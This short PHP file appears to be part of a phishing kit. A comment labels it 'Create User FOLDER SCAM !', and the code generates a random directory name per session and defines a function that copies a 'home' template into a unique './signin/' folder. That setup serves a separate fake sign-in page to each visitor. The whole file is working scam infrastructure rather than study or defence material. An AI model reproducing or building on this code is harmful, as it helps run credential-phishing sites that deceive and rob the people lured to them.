<?php
include "lock.php";
session_start();
// Create User FOLDER SCAM !
// First check browser screen size.. 
// If screen > 780px go to desktop view
// Else If screen < 680px go to mobile view
// Else go to Desktop view. Desktop view will detect screen size..


for ($DIR = '', $i = 0, $z = strlen($a = 'ABCDEMN0123456789')-1; $i != 7; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./signin/".$DIR;
$rush4="home";


function recurse_copy($rush4,$DIR) {
$dir = opendir($rush4);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($rush4 . '/' . $file) ) {
recurse_copy($rush4 . '/' . $file,$DIR . '/' . $file);
}else {
copy($rush4 . '/' . $file,$DIR . '/' . $file);
		}
	}
}
closedir($dir);
}

?>